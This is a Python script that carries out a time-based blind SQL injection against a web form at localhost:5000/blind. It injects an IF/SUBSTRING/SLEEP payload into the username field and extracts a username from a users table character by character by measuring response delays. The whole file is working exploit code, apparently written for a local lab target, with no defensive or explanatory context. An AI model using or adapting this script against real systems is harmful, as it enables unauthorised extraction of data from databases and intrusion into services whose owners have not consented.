import requests
import string
import time

URL = "http://localhost:5000/blind"
CHARSET = string.ascii_lowercase + string.digits  # you can expand to all printable characters

# This is where we build the username character by character
extracted = ""

for position in range(1, 30):  # assume username is max 30 characters
    found = False
    for char in CHARSET:
        payload = f"' OR IF(SUBSTRING((SELECT username FROM users LIMIT 1),{position},1) = '{char}', SLEEP(5), 0) -- "

        data = {"username": payload}
        print(f"[*] Trying position {position}, character '{char}'...")

        start = time.time()
        r = requests.post(URL, data=data)
        duration = time.time() - start

        if duration >= 5:
            print(f"[+] Found character at position {position}: {char}")
            extracted += char
            found = True
            break
    
    if not found:
        print("[!] No more characters found. Breaking out.")
        break

print(f"\n[✓] Extracted username: {extracted}")